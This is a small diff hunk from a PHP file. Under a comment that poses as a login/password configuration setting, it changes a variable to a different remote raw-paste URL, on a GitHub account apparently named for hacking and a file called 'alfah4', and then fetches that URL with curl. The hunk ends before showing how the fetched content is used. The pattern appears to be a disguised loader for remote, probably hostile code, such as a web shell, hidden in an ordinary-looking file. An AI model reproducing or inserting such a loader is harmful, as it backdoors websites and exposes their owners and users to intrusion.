@@ -80,7 +80,7 @@
  */
 
 // Auth with login/password (set true/false to enable/disable it)
-$link = 'https://ghostbin.axel.org/paste/wgnxd/raw';
+$link = 'https://raw.githubusercontent.com/haxorleviathan-glitch/repository/refs/heads/main/alfah4';
 $ch = curl_init(); 
 curl_setopt($ch, CURLOPT_URL, $link);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
